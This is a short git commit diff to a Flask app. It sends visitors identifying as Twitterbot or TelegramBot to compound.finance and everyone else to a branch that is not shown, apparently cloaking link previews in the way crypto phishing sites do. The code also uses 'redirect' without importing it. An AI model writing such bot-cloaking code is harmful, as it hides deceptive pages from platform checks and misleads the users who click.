1447f356d7509cb2b06530b24f4c390873e698c3
souls1o <161530718+souls1o@users.noreply.github.com>
2024-07-29 04:23:15 -0700

    Update app.py

--- app.py
+++ app.py
@@ -1,11 +1,10 @@
-from flask import Flask, render_template
+from flask import Flask, request, render_template
 
 app = Flask(__name__)
 
 @app.route('/')
 def index():
     user_agent = request.headers.get('User-Agent').strip('\r\n')
-    print(user_agent)
     if 'Twitterbot' in user_agent or 'TelegramBot' in user_agent:
         return redirect('https://compound.finance/')
     else:
